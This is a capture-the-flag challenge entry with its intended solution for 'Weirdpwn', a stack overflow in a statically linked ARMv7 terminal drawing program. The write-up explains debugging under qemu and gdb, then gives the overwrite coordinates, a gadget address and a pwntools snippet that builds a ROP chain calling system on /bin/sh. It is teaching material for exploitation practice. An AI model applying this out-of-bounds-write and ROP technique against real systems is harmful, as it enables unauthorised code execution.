# Description(s)
- Challenge name: Weirdpwn
- Proposed difficulty: Very Hard
- Challenge description: 

    Jeg lavede et program til at tegne i terminalen på mit kursus i grafik.
    Siden M1 er populært nu om dage, besluttede jeg mig for at øve mig på noget ARM.
            
    [challenge_x.zip](https://nextcloud.ntp-event.dk:8443/s/ENGaEg9NcjEaAoe/download/challenge_x.zip)
            
    `nc weirdpwn.hkn 1024`

# Intended solution
By alanyzing this program, we can see the this is a statically linked ARMv7 binary.

It is running with the following protections:
```
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Notable it has no PIE so we need no leak of the program address.

This challenge is conceptually really easy, the hard pard is working with developing an exploit for a different architecture.

For the full exploit see `solve.py`.

Ideally you would use Qemu to develop an exploit. Qemu allows attaching and wainting for a network debugger with the `-g` flag.
Running the challenge binary like so will wait for a debugger `qemu-arm -g 5555 challenge`.

Now, in a different terminal you open gdb and load the binary, the shorthand is `gdb ./challenge`.
Instead of running the binary with `r`, you attach to the qemu session by running `target remote localhost:5555`.
Now gdb is attached and you can develop an exploit.

The vulnerablility lies in the fact that an image is stored on the stack, and no bound guards are applied when drawing to it, so drawing outside the frame will lead to clobbering the stack.

Through some experimentation the return address is overwritten by writing to the following coordinates `-12 0 -8 0 65`.
This will overwrite the pc with 'AAAA'.
As we need to pick a color for each line we draw we need to draw a dot 4 times to get an arbitrary 4-byte write.

The program is statically compiled and uses `system` to run the time command. This means that the __libc_system function is compiled into the binary.

The ARM calling convention says that the first argument is passed in `r0`, so we need to find a gadget to control r0.
Once such a gadget has been located, it can be "drawn" on the stack like so:
```
baddr = p32(0x0002b9f4) #gadget pop {r0 r4 pc}
baddr += p32(binsh) # r0 the address of the /bin/sh string 
baddr += p32(0x0)   # TRASH
baddr += p32(system) # call system
p.sendline("3")
p.recvuntil(b"?\r\n")
p.sendline("16")
for a in range(16):
    p.sendline(f"{(12-a)*-1} 0 {(12-a)*-1} 0 {int(baddr[a])}")
```
